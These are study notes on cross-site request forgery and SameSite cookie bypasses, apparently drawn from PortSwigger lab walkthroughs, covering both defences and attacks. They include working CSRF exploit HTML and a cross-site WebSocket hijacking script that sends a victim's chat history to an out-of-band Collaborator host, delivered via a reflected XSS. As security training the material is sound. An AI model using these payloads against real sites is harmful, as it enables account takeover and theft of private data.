@@ -1,0 +1,748 @@
+# Cross-Site Request Forgery (CSRF)
+
+## What is CSRF?
+
+* A web vulnerability that tricks an authenticated user’s browser into performing actions the user did **not intend** (e.g., change email, password, transfer funds).
+* Exploits the browser automatically including credentials (usually cookies) in requests to a target site.
+* Partly circumvents same-origin protections by leveraging the victim’s authenticated session.
+
+---
+
+## Impact
+
+* Attacker can make state-changing requests on behalf of the victim.
+* Can lead to account takeover (e.g., by changing email then resetting password).
+* If victim is privileged (admin), attacker may gain control of the application/data.
+
+---
+
+## Conditions required for CSRF
+
+1. **A relevant action** — There is a server endpoint that performs an action valuable to the attacker (change email, change password, transfer money, change permissions).
+2. **Credential autofill** — The application authenticates users via cookies (or another credential automatically sent by the browser, e.g., HTTP Basic auth or client certs).
+3. **Predictable request parameters** — The attacker can construct a request with all required parameters (no unknown/unguessable values like current password).
+
+---
+
+## Example (conceptual)
+
+* Legitimate request to change email:
+
+```
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=SESSIONVALUE
+Content-Type: application/x-www-form-urlencoded
+
+email=wiener@normal-user.com
+```
+
+* Attacker HTML that triggers the change (victim’s browser sends cookie automatically):
+
+```html
+<form action="https://vulnerable-website.com/email/change" method="POST">
+  <input type="hidden" name="email" value="pwned@evil-user.net">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+---
+
+## How attackers build/ deliver CSRF exploits
+
+* Manually craft HTML forms, images, or script that cause the target request.
+* Use tools (e.g., Burp Suite’s **Generate CSRF PoC**) to auto-generate exploit HTML from a captured request.
+* Delivery vectors: attacker-controlled site, comments on popular sites, phishing links, email/social posts.
+* Simple GET-based actions can be delivered via an `<img src="...">` or direct URL.
+
+---
+
+## Common defenses
+
+1. **CSRF tokens (synchronizer token pattern)**
+
+   * Server issues a unique, unpredictable token per session/form; client must include it in state-changing requests.
+   * Token must be tied to the user session and validated server-side.
+2. **SameSite cookies**
+
+   * Browser-level setting that prevents cookies being sent on cross-site requests in many contexts (Lax/Strict).
+   * Since 2021 major browsers default to Lax for cookies, mitigating many CSRF scenarios.
+3. **Referer / Origin header checks**
+
+   * Server validates `Referer` or `Origin` header to ensure request originated from the same site.
+   * Less reliable (headers can be absent/stripped or not present in some contexts).
+4. **Double-submit cookies**
+
+   * Send a token in a cookie and require it in a request parameter/header; server checks they match.
+5. **Require re-authentication / knowledge factors**
+
+   * Require the current password or a second factor for sensitive changes (prevents CSRF if value is secret).
+
+---
+
+## Limitations & bypasses to be aware of
+
+* CSRF tokens must be unpredictable and validated — predictable or reused tokens are ineffective.
+* SameSite helps but may not protect all endpoints (e.g., cross-site POSTs from top-level navigations under Lax).
+* Referer checks can fail in some network setups or be stripped by privacy tools.
+* Complex defenses can sometimes be bypassed; defense-in-depth is recommended.
+
+---
+
+## Testing & tooling
+
+* Use Burp Suite Professional’s **Generate CSRF PoC** to quickly build exploit HTML from captured requests.
+* When testing, try:
+
+  * Simple form POST/GET exploits.
+  * Image/GET-based requests for GET endpoints.
+  * CSRF PoC HTML served from attacker-controlled domain while logged in as victim.
+
+---
+
+## Quick checklist for developers (to prevent CSRF)
+
+* Use anti-CSRF tokens on all state-changing requests (POST, PUT, DELETE, etc.).
+* Set cookies with appropriate `SameSite` attribute (and `Secure`, `HttpOnly` where applicable).
+* Validate `Origin` or `Referer` for sensitive endpoints (as a supplementary check).
+* Require additional verification for highly sensitive actions (password change, transfer).
+* Avoid doing important state changes via GET requests.
+* Educate QA to include CSRF checks in security testing.
+
+---
+
+## Quick checklist for pentesters
+
+* Look for state-changing endpoints that rely solely on cookies and accept predictable parameters.
+* Try simple form POST/GET exploits and auto-generated PoCs.
+* Test whether CSRF tokens exist, are validated, or can be predicted/replayed.
+* Check cookie `SameSite` behavior and whether any endpoints are exempt.
+
+---
+
+# Bypassing CSRF token validation
+
+- A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action.
+
+- A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:
+    ```html
+    <form name="change-email-form" action="/my-account/change-email" method="POST">
+        <label>Email</label>
+        <input required type="email" name="email" value="example@normal-website.com">
+        <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
+        <button class='button' type='submit'> Update email </button>
+    </form>
+    ```
+
+- Submitting this form results in the following request:
+    ```http
+    POST /my-account/change-email HTTP/1.1
+    Host: normal-website.com
+    Content-Length: 70
+    Content-Type: application/x-www-form-urlencoded
+
+    csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
+
+    ```
+- When implemented correctly, CSRF tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of the victim. As the attacker has no way of predicting the correct value for the CSRF token, they won't be able to include it in the malicious request.
+
+**Note:**  CSRF tokens don't have to be sent as hidden parameters in a POST request. Some applications place CSRF tokens in HTTP headers, for example. The way in which tokens are transmitted has a significant impact on the security of a mechanism as a whole. For more information, see How to prevent CSRF vulnerabilities.
+## Common flaws in CSRF token validation
+
+- CSRF vulnerabilities typically arise due to flawed validation of CSRF tokens. In this section, we'll cover some of the most common issues that enable attackers to bypass these defenses.
+
+### Validation of CSRF token depends on request method
+
+- Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
+
+- In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:
+```
+GET /email/change?email=pwned@evil-user.net HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+```
+### Validation of CSRF token depends on token being present
+
+- Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
+
+- In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:
+    ```http
+    POST /email/change HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 25
+    Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+    email=pwned@evil-user.net
+    ```
+### CSRF token is not tied to the user session
+
+- Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.
+
+- In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack. 
+
+### CSRF token is tied to a non-session cookie
+
+- In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:
+    ```http
+    POST /email/change HTTP/1.1
+    Host: vulnerable-website.com
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 68
+    Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+
+    csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+    ```
+
+- This situation is harder to exploit but is still vulnerable. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 
+
+
+- **Note :** The cookie-setting behavior does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on `staging.demo.normal-website`.com could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.
+
+### CSRF token is simply duplicated in a cookie
+
+In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state:
+```http
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+```
+--- 
+
+# SameSite cookie restrictions
+
+### What SameSite
+
+* SameSite is a browser rule that controls when cookies are sent with requests that come from other websites.
+* It helps reduce cross-site attacks like CSRF (cross-site request forgery), cross-site leaks, and some CORS exploits.
+
+---
+## What is a site in the context of SameSite cookies?
+### Why it matters now
+
+* Since 2021 Chrome applies **Lax-by-default** for cookies that don’t set SameSite explicitly.
+* That means if a site doesn’t set SameSite, Chrome treats its cookies as `SameSite=Lax`. Other browsers may follow.
+* So developers and testers must understand SameSite and possible bypasses.
+
+---
+
+### What “site” means for SameSite
+
+* A **site** = top-level domain (TLD) plus one extra level — often called **TLD+1** (e.g., `example.com`, `example.co.uk` uses an eTLD rule).
+* The URL scheme (http vs https) is considered too: `http://app.example.com` → `https://app.example.com` is treated as **cross-site** by most browsers.
+![site-definition](images/site-definition.png)
+
+**Note:** eTLD (effective TLD) handles multi-part suffixes like `.co.uk`.
+---
+
+### Site vs Origin — what's the difference
+
+* **Site** is broader (covers related hostnames under the same TLD+1).
+* **Origin** is strict: scheme + domain + port must match exactly.
+* Because of that, a request can be **same-site but cross-origin**.
+![site-vs-origin](images/site-vs-origin.png)
+    - **Site** = scheme (http/https) + top-level domain (TLD) + one extra level (TLD+1)
+    - **Origin** = scheme + full domain + port
+
+
+Example table (simple):
+
+| Request from              |                     Request to | Same-site? | Same-origin? |
+| ------------------------- | -----------------------------: | ---------: | -----------: |
+| `https://example.com`     |          `https://example.com` |        Yes |          Yes |
+| `https://app.example.com` | `https://intranet.example.com` |        Yes |           No |
+| `https://example.com`     |     `https://example.com:8080` |        Yes |           No |
+| `https://example.com`     |        `https://example.co.uk` |         No |           No |
+| `https://example.com`     |           `http://example.com` |         No |           No |
+
+* **Security implication:** If you can run arbitrary JavaScript on one host in a site, you may be able to affect other hosts in the same site (because they’re same-site).
+
+---
+
+### How SameSite works (concept)
+
+* Before SameSite: browsers sent cookies on every request to the cookie's domain, including requests triggered by other sites.
+* SameSite lets site owners limit when cookies are included in cross-site requests — reducing CSRF risk.
+* Cookies are set with the `SameSite` attribute in the `Set-Cookie` header.
+
+Example:
+
+```
+Set-Cookie: session=abc123; SameSite=Strict
+```
+
+Major values: `Strict`, `Lax`, `None`.
+
+**Chrome note:** If no `SameSite` is set, Chrome treats it as `Lax` by default.
+
+---
+
+### SameSite values — simple explanations
+
+**Strict**
+
+* Browser will NOT send the cookie in any cross-site requests.
+* Only sent when the site in the address bar matches the cookie’s site.
+* Most secure for sensitive cookies (modify data, authenticated pages).
+* Might break desired cross-site behaviors (bad UX for some flows).
+
+**Lax**
+
+* Cookie is sent for **top-level navigations** that are **GET** requests (for example, when a user clicks a link).
+* Cookie is **not** sent for cross-site POSTs, background requests (iframes, images, XHR/fetch).
+* Default in Chrome for cookies without a SameSite.
+
+**None**
+
+* Disables SameSite protections — cookie is sent in **all** requests, including cross-site.
+* When using `SameSite=None`, **must** also use `Secure` (cookie only over HTTPS), otherwise browsers reject it.
+* Used when third-party contexts legitimately need the cookie (e.g., some cross-site integrations or trackers).
+
+---
+
+### Bypassing Lax using GET requests (how attackers can abuse it)
+
+* Some servers accept state-changing actions via **GET** or aren't strict about methods.
+* Because Lax allows cookies on **top-level GET navigations**, an attacker can force a victim to visit a specially-crafted URL which includes action parameters. The browser will include the session cookie.
+* Example attack snippet:
+
+```html
+<script>
+  // top-level navigation to a state-changing GET endpoint
+  document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
+</script>
+```
+
+* Even if the server expects POST, some frameworks let you override method with form parameters (e.g., `_method=GET`) or accept GET-equivalent actions—this can be abused:
+
+```html
+<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
+  <input type="hidden" name="_method" value="GET">
+  <input type="hidden" name="recipient" value="hacker">
+  <input type="hidden" name="amount" value="1000000">
+</form>
+```
+
+* Many frameworks have similar method-override options — these can allow Lax bypasses.
+
+---
+
+### Key takeaways about bypass risks
+
+* `SameSite=Lax` reduces CSRF but **does not** guarantee protection if:
+
+  * Server accepts state-changing GET requests.
+  * Server supports method override parameters or similar tricks.
+  * A cookie is set with `SameSite=None` or no SameSite (Chrome Lax-by-default helps but not everywhere).
+* Cross-origin JavaScript execution within the same site can also bypass site-based defenses.
+
+---
+
+### Short checklist for secure practice (what developers/testers should do)
+
+* Never perform sensitive state changes on GET endpoints — use POST/PUT/DELETE and enforce method checks.
+* Use anti-CSRF tokens (synchronizer tokens, double-submit cookies) for state-changing operations.
+* Set session cookies to `SameSite=Strict` if that doesn't break legitimate flows, or `Lax` with other CSRF mitigations.
+* Avoid using `SameSite=None` for sensitive cookies. If necessary, ensure `Secure` and only when cross-site usage is truly required.
+* Enforce server-side checks: verify `Origin` or `Referer` headers for critical requests (don’t rely only on browser cookie behavior).
+* Mark cookies `HttpOnly` (prevents JavaScript access) and `Secure` (HTTPS-only).
+* Test endpoints for method override parameters and reject unexpected method overrides.
+* Regularly test for CSRF with real attack scenarios (including top-level GET navigation tricks).
+
+---
+
+### Final simple summary
+
+* **SameSite** controls when cookies are sent cross-site and helps lower CSRF risk.
+* `Strict` = safest, `Lax` = allows top-level GET navigations, `None` = disables restrictions (must use `Secure`).
+* Chrome treats unspecified SameSite as `Lax` now.
+* Attackers can bypass Lax if servers accept GET or method overrides for actions — so server-side protections (CSRF tokens, method checks, Origin/Referer verification) are still essential.
+
+---
+## SameSite Lax bypass via method override
+### Bypass the SameSite restrictions
+
+- Send the POST /my-account/change-email request to Burp Repeater.
+- In Burp Repeater, right-click on the request and select Change request method. Burp automatically generates an equivalent GET request.
+- Send the request. Observe that the endpoint only allows POST requests.
+- Try overriding the method by adding the `_method` parameter to the query string:
+```http
+GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
+```
+- Send the request. Observe that this seems to have been accepted by the server.
+
+- In the browser, go to your account page and confirm that your email address has changed.
+
+### Craft an exploit
+
+- In the browser, go to the exploit server.
+- In the Body section, create an HTML/JavaScript payload that induces the viewer's browser to issue the malicious GET request. Remember that this must cause a top-level navigation in order for the session cookie to be included. 
+
+- The following is one possible approach:
+```html
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+</script>
+```
+--- 
+
+
+## Bypassing SameSite restrictions using on-site gadgets
+
+* If a cookie is set with the SameSite=Strict attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site.
+
+* One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. For some examples, see our materials on DOM-based open redirection.
+
+* As far as browsers are concerned, these client-side redirects aren't really redirects at all; the resulting request is just treated as an ordinary, standalone request. Most importantly, this is a same-site request and, as such, will include all cookies related to the site, regardless of any restrictions that are in place.
+
+* If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely. 
+
+
+### Study the change email function
+
+- In Burp's browser, log in to your own account and change your email address.
+
+- In Burp, go to the Proxy > HTTP history tab.
+
+- Study the POST /my-account/change-email request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.
+
+- Look at the response to your POST /login request. Notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests.
+
+### Identify a suitable gadget
+
+- In the browser, go to one of the blog posts and post an arbitrary comment. Observe that you're initially sent to a confirmation page at `/post/comment/confirmation?postId=x` but, after a few seconds, you're taken back to the blog post.
+- In Burp, go to the proxy history and notice that this redirect is handled client-side using the imported JavaScript file `/resources/js/commentConfirmationRedirect.js`.
+- Study the JavaScript and notice that this uses the postId query parameter to dynamically construct the path for the client-side redirect.
+
+- In the proxy history, right-click on the `GET /post/comment/confirmation?postId=x` request and select Copy URL.
+- In the browser, visit this URL, but change the postId parameter to an arbitrary string.
+- `/post/comment/confirmation?postId=foo`
+- Observe that you initially see the post confirmation page before the client-side JavaScript attempts to redirect you to a path containing your injected string, for example, `/post/foo`.
+
+- Try injecting a path traversal sequence so that the dynamically constructed redirect URL will point to your account page:
+`/post/comment/confirmation?postId=1/../../my-account`
+
+- Observe that the browser normalizes this URL and successfully takes you to your account page. This confirms that you can use the postId parameter to elicit a GET request for an arbitrary endpoint on the target site.
+
+### Bypass the SameSite restrictions
+- In the browser, go to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested. The following is one possible approach:
+```html
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
+</script>
+```
+Store and view the exploit yourself.
+Observe that when the client-side redirect takes place, you still end up on your logged-in account page. This confirms that the browser included your authenticated session cookie in the second request, even though the initial comment-submission request was initiated from an arbitrary external site.
+
+### Craft an exploit
+- Send the `POST /my-account/change-email` request to Burp Repeater.
+- In Burp `Repeater`, right-click on the request and select Change request method. Burp automatically generates an equivalent `GET` request.
+- Send the request. Observe that the endpoint allows you to change your email address using a `GET` request.
+- Go back to the exploit server and change the postId parameter in your exploit so that the redirect causes the browser to send the equivalent GET request for changing your email address:
+```html
+<script>
+    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+```
+---
+
+# Bypassing SameSite restrictions via vulnerable sibling domains
+Study the live chat feature
+
+    In Burp's browser, go to the live chat feature and send a few messages.
+
+    In Burp, go to the Proxy > HTTP history tab and find the WebSocket handshake request. This should be the most recent GET /chat request.
+
+    Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.
+
+    In the browser, refresh the live chat page.
+
+    In Burp, go to the Proxy > WebSockets history tab. Notice that when you refresh the page, the browser sends a READY message to the server. This causes the server to respond with the entire chat history.
+
+Confirm the CSWSH vulnerability
+
+    In Burp, go to the Collaborator tab and click Copy to clipboard. A new Collaborator payload is saved to your clipboard.
+
+    In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:
+    <script>
+        var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+        ws.onopen = function() {
+            ws.send("READY");
+        };
+        ws.onmessage = function(event) {
+            fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+        };
+    </script>
+
+    Store and view the exploit yourself
+
+    In Burp, go back to the Collaborator tab and click Poll now. Observe that you have received an HTTP interaction, which indicates that you've opened a new live chat connection with the target site.
+
+    Notice that although you've confirmed the CSWSH vulnerability, you've only exfiltrated the chat history for a brand new session, which isn't particularly useful.
+
+    Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.
+
+    Notice that your session cookie was not sent with the request.
+
+    In the response, notice that the website explicitly specifies SameSite=Strict when setting session cookies. This prevents the browser from including these cookies in cross-site requests.
+
+Identify an additional vulnerability in the same "site"
+
+    In Burp, study the proxy history and notice that responses to requests for resources like script and image files contain an Access-Control-Allow-Origin header, which reveals a sibling domain at cms-YOUR-LAB-ID.web-security-academy.net.
+
+    In the browser, visit this new URL to discover an additional login form.
+
+    Submit some arbitrary login credentials and observe that the username is reflected in the response in the Invalid username message.
+
+    Try injecting an XSS payload via the username parameter, for example:
+    <script>alert(1)</script>
+
+    Observe that the alert(1) is called, confirming that this is a viable reflected XSS vector.
+
+    Send the POST /login request containing the XSS payload to Burp Repeater.
+
+    In Burp Repeater, right-click on the request and select Change request method to convert the method to GET. Confirm that it still receives the same response.
+
+    Right-click on the request again and select Copy URL. Visit this URL in the browser and confirm that you can still trigger the XSS. As this sibling domain is part of the same site, you can use this XSS to launch the CSWSH attack without it being mitigated by SameSite restrictions.
+
+Bypass the SameSite restrictions
+
+    Recreate the CSWSH script that you tested on the exploit server earlier.
+    <script>
+        var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
+        ws.onopen = function() {
+            ws.send("READY");
+        };
+        ws.onmessage = function(event) {
+            fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+        };
+    </script>
+
+    URL encode the entire script.
+
+    Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter. The following is one possible approach:
+    <script>
+        document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
+    </script>
+
+    Store and view the exploit yourself.
+
+    In Burp, go back to the Collaborator tab and click Poll now. Observe that you've received a number of new interactions, which contain your entire chat history.
+
+    Go to the Proxy > HTTP history tab and find the WebSocket handshake request that was triggered by your script. This should be the most recent GET /chat request.
+
+    Confirm that this request does contain your session cookie. As it was initiated from the vulnerable sibling domain, the browser considers this a same-site request.
+
+Deliver the exploit chain
+
+    Go back to the exploit server and deliver the exploit to the victim.
+
+    In Burp, go back to the Collaborator tab and click Poll now.
+
+    Observe that you've received a number of new interactions.
+
+    Study the HTTP interactions and notice that these contain the victim's chat history.
+
+    Find a message containing the victim's username and password.
+
+    Use the newly obtained credentials to log in to the victim's account and the lab is solved.
+---
+
+# Bypassing SameSite Lax restrictions with newly issued cookies
+
+- Cookies with Lax SameSite restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions.
+- As mentioned earlier, if a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default. However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.
+
+  **Note:** This two-minute window does not apply to cookies that were explicitly set with the SameSite=Lax attribute.
+- It's somewhat impractical to try timing the attack to fall within this short window. On the other hand, if you can find a gadget on the site that enables you to force the victim to be issued a new session cookie, you can preemptively refresh their cookie before following up with the main attack. For example, completing an OAuth-based login flow may result in a new session each time as the OAuth service doesn't necessarily know whether the user is still logged in to the target site.
+- To trigger the cookie refresh without the victim having to manually log in again, you need to use a top-level navigation, which ensures that the cookies associated with their current OAuth session are included. This poses an additional challenge because you then need to redirect the user back to your site so that you can launch the CSRF attack.
+- Alternatively, you can trigger the cookie refresh from a new tab so the browser doesn't leave the page before you're able to deliver the final attack. A minor snag with this approach is that browsers block popup tabs unless they're opened via a manual interaction. For example, the following popup will be blocked by the browser by default:
+```js
+window.open('https://vulnerable-website.com/login/sso');
+```
+- To get around this, you can wrap the statement in an onclick event handler as follows:
+```js
+window.onclick = () => {
+    window.open('https://vulnerable-website.com/login/sso');
+}
+```
+## Solution
+**Study the change email function**
+- In Burp's browser, log in via your social media account and change your email address.
+- In Burp, go to the `Proxy > HTTP history` tab.
+- Study the `POST /my-account/change-email` request and notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions.
+- Look at the response to the `GET /oauth-callback?code=[...]` request at the end of the OAuth flow. Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default Lax restriction level.
+
+**Attempt a CSRF attack**
+- In the browser, go to the exploit server.
+- Use the following template to create a basic CSRF 
+
+**attack for changing the victim's email address:**
+  
+  ```html
+  <script>
+      history.pushState('', '', '/')
+  </script>
+  <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="foo@bar.com" />
+      <input type="submit" value="Submit request" />
+  </form>
+  <script>
+      document.forms[0].submit();
+  </script>
+  ```
+- Store and view the exploit yourself. What happens next depends on how much time has elapsed since you logged in:
+
+  - If it has been longer than two minutes, you will be logged in via the OAuth flow, and the attack will fail. In this case, repeat this step immediately.
+  - If you logged in less than two minutes ago, the attack is successful and your email address is changed. From the Proxy > HTTP history tab, find the POST /my-account/change-email request and confirm that your session cookie was included even though this is a cross-site POST request.
+
+**Bypass the SameSite restrictions**
+
+- In the browser, notice that if you visit /social-login, this automatically initiates the full OAuth flow. If you still have a logged-in session with the OAuth server, this all happens without any interaction.
+- From the proxy history, notice that every time you complete the OAuth flow, the target site sets a new session cookie even if you were already logged in.
+- Go back to the exploit server.
+- Change the JavaScript so that the attack first refreshes the victim's session by forcing their browser to visit /social-login, then submits the email change request after a short pause. The following is one possible approach:
+  ```html
+  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+      <input type="hidden" name="email" value="pwned@web-security-academy.net">
+  </form>
+  <script>
+      window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+      setTimeout(changeEmail, 5000);
+
+      function changeEmail(){
+          document.forms[0].submit();
+      }
+  </script>
+  ```
+
+- Note that we've opened the /social-login in a new window to avoid navigating away from the exploit before the change email request is sent.
+- Store and view the exploit yourself. Observe that the initial request gets blocked by the browser's popup blocker.
+- Observe that, after a pause, the CSRF attack is still launched. However, this is only successful if it has been less than two minutes since your cookie was set. If not, the attack fails because the popup blocker prevents the forced cookie refresh.
+
+**Bypass the popup blocker**
+- Realize that the popup is being blocked because you haven't manually interacted with the page.
+- Tweak the exploit so that it induces the victim to click on the page and only opens the popup once the user has clicked. The following is one possible approach:
+  ```html
+  <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+      <input type="hidden" name="email" value="pwned@portswigger.net">
+  </form>
+  <p>Click anywhere on the page</p>
+  <script>
+      window.onclick = () => {
+          window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+          setTimeout(changeEmail, 5000);
+      }
+
+      function changeEmail() {
+          document.forms[0].submit();
+      }
+  </script>
+  ```
+---
+# Bypassing Referer-based CSRF defenses
+
+Aside from defenses that employ CSRF tokens, some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This approach is generally less effective and is often subject to bypasses.
+Referer header
+
+The HTTP Referer header (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request, including by clicking a link or submitting a form. Various methods exist that allow the linking page to withhold or modify the value of the Referer header. This is often done for privacy reasons.
+Validation of Referer depends on header being present
+
+Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.
+
+In this situation, an attacker can craft their CSRF exploit in a way that causes the victim user's browser to drop the Referer header in the resulting request. There are various ways to achieve this, but the easiest is using a META tag within the HTML page that hosts the CSRF attack:
+```html
+<meta name="referrer" content="never">
+```
+---
+
+```html
+<meta name="referrer" content="no-referrer">
+```
+
+controls how the **`Referer` HTTP header** is sent by the browser when a user clicks a link or makes a request from the page. Specifically:
+
+---
+
+### Behavior of `content="no-referrer"`
+
+* The browser **does not send the `Referer` header at all** when navigating from this page to another page, or when loading resources (images, scripts, iframes, etc.) from other domains.
+* The destination site will **not know the URL of the page** where the request originated.
+
+---
+
+### Other common `referrer` values
+
+| Value                             | Description                                                                                                                                      |
+| --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `no-referrer`                     | Never send the Referer header.                                                                                                                   |
+| `no-referrer-when-downgrade`      | Default in many browsers. Sends the Referer header only when navigating from HTTPS → HTTPS, but not HTTPS → HTTP.                                |
+| `origin`                          | Sends only the origin (scheme + domain + port), not the full URL.                                                                                |
+| `strict-origin-when-cross-origin` | Sends full URL for same-origin requests; sends only the origin for cross-origin HTTPS → HTTPS requests; sends nothing for HTTPS → HTTP requests. |
+| `unsafe-url`                      | Always send the full URL in the Referer header, even cross-origin.                                                                               |
+
+---
+
+### Example use-case
+
+```html
+<head>
+    <meta name="referrer" content="no-referrer">
+</head>
+<body>
+    <a href="https://example.com">Go to example.com</a>
+</body>
+```
+
+* When the user clicks the link, the request to `https://example.com` **will not include a `Referer` header**.
+* Useful for **privacy reasons** (you don’t want the destination site to know the exact URL of the source page).
+
+In short: it’s a privacy/security mechanism that **prevents the browser from leaking the page URL to other sites**.
+
+---
+
+## HTML `<meta>` tags, HTTP headers, and HTTP request/response
+
+| Meta Tag                           | Example                                                                     | Purpose / Effect                                  | HTTP Header Equivalent                         | Typical HTTP Request / Response Behavior                                                               |
+| ---------------------------------- | --------------------------------------------------------------------------- | ------------------------------------------------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
+| **Charset / encoding**             | `<meta charset="UTF-8">`                                                    | Specifies document character encoding             | `Content-Type: text/html; charset=UTF-8`       | Sent in **HTTP response** by server; informs browser how to interpret bytes of HTML                    |
+| **Viewport**                       | `<meta name="viewport" content="width=device-width, initial-scale=1.0">`    | Controls mobile layout and scaling                | None                                           | Affects **client-side rendering**; no HTTP request/response header sent                                |
+| **Page refresh / redirect**        | `<meta http-equiv="refresh" content="5;url=https://example.com/">`          | Refresh page or redirect after delay              | `Refresh: 5; url=https://example.com/`         | Server can send `Refresh` header; browser performs GET request to target URL after delay               |
+| **Content Security Policy (CSP)**  | `<meta http-equiv="Content-Security-Policy" content="default-src 'self';">` | Restrict sources of scripts, styles, images, etc. | `Content-Security-Policy: default-src 'self';` | Browser enforces CSP on subsequent resource **requests** (JS, CSS, images, etc.)                       |
+| **X-UA-Compatible (IE mode)**      | `<meta http-equiv="X-UA-Compatible" content="IE=edge">`                     | Controls Internet Explorer compatibility mode     | `X-UA-Compatible: IE=edge`                     | Affects **rendering mode** of IE when parsing HTML; no change to HTTP request                          |
